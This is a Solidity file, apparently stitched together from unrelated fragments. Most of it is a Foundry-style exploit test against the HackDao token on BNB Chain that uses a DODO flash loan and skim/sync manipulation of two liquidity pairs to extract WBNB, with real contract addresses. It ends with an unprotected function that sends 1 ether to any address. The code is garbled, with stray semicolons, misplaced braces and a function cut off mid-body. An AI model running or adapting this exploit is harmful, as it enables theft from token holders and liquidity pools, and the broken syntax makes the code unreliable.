
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
contract ContractTest is DSTest{
    IERC20 HackDao = IERC20(0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2);
    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 18073756)};
    function testExploit() public{
        WBNB.approve(address(Router), type(uint).max);
        HackDao.approve(address(Router), type(uint).max);
        DVM(dodo).flashLoan(1_900 * 1e18, 0, address(this), new bytes(1));
        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit",
            WBNB.balanceOf(address(this)),;
            18)};
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public{
        buyHackDao();
        HackDao.transfer(address(Pair1), HackDao.balanceOf(address(this)));
        Pair1.skim(address(Pair2));
        Pair1.sync();
        Pair2.skim(address(Pair1));
        (uint reserve0, uint reserve1,) = Pair1.getReserves();
        uint amountAfter = HackDao.balanceOf(address(Pair1));
        uint amountin = amountAfter - reserve0;
        uint amountout = amountin * 9975 * reserve1 / (reserve0 * 10000 + amountin * 9975);
        Pair1.swap(0, amountout, address(this), "");
        WBNB.transfer(dodo, 1_900 * 1e18)};
    function buyHackDao() internal{
function replayableTransfer1(address to) public {
    payable(to).transfer(1 ether)}